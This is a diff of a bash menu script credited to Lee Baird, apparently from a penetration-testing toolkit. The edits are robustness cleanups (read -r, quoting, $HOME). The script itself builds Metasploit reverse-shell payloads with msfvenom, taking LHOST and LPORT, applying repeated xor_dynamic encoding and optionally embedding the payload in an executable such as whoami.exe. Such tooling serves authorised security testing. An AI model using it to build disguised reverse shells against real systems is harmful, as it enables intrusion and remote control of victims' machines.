@@ -1,4 +1,8 @@
-#!/usr/bin/bash
+#!/usr/bin/env bash
+
+# by Lee Baird (@discoverscripts)
+
+set -euo pipefail
 
 clear
 f_banner
@@ -7,15 +11,15 @@ f_format(){
 echo
 echo -e "${BLUE}Formats${NC}"
 echo
-echo '1. aspx'
-echo '2. c'
-echo '3. csharp'
-echo '4. exe'
-echo '5. psh'
-echo '6. raw'
+echo "1. aspx"
+echo "2. c"
+echo "3. csharp"
+echo "4. exe"
+echo "5. psh"
+echo "6. raw"
 echo
 echo -n "Choice: "
-read choice2
+read -r choice2
 
 case $choice2 in
     1) extention=".aspx"
@@ -55,7 +59,7 @@ echo "16.  Previous menu"
 
 echo
 echo -n "Choice: "
-read choice
+read -r choice
 
 case $choice in
     1) payload="android/meterpreter/reverse_tcp"
@@ -139,7 +143,7 @@ esac
 
 echo
 echo -n "LHOST: "
-read lhost
+read -r lhost
 
 # Check for no answer
 if [ -z $lhost ]; then
@@ -149,7 +153,7 @@ if [ -z $lhost ]; then
 fi
 
 echo -n "LPORT: "
-read lport
+read -r lport
 
 # Check for no answer.
 if [ -z $lport ]; then
@@ -164,7 +168,7 @@ if [[ $lport -lt 1 || $lport -gt 65535 ]]; then
 fi
 
 echo -n "Iterations: "
-read iterations
+read -r iterations
 
 # Check for no answer.
 if [ -z $iterations ]; then
@@ -181,15 +185,15 @@ x=$(echo $payload | sed 's/\//-/g')
 
 echo
 echo -n "Use a template file? (y/N) "
-read answer
+read -r answer
 
 if [ "$answer" == "y" ]; then
     echo -n "Enter the path to the file (default whoami.exe): "
-    read template
+    read -r template
 
     if [ -z $template ]; then
         template=/usr/share/windows-resources/binaries/whoami.exe
-        echo '[*] Using /usr/share/windows-resources/binaries/whoami.exe'
+        echo "[*] Using /usr/share/windows-resources/binaries/whoami.exe"
     fi
 
     if [ ! -f $template ]; then
@@ -197,8 +201,8 @@ if [ "$answer" == "y" ]; then
     fi
 
     echo
-    msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -x $template -e x64/xor_dynamic -i $iterations -o $home/data/$x-$lport-$iterations$extention
+    msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -x $template -e x64/xor_dynamic -i $iterations -o $HOME/data/$x-$lport-$iterations$extention
 else
     echo
-    msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -e x64/xor_dynamic -i $iterations -o $home/data/$x-$lport-$iterations$extention
+    msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -e x64/xor_dynamic -i $iterations -o $HOME/data/$x-$lport-$iterations$extention
 fi
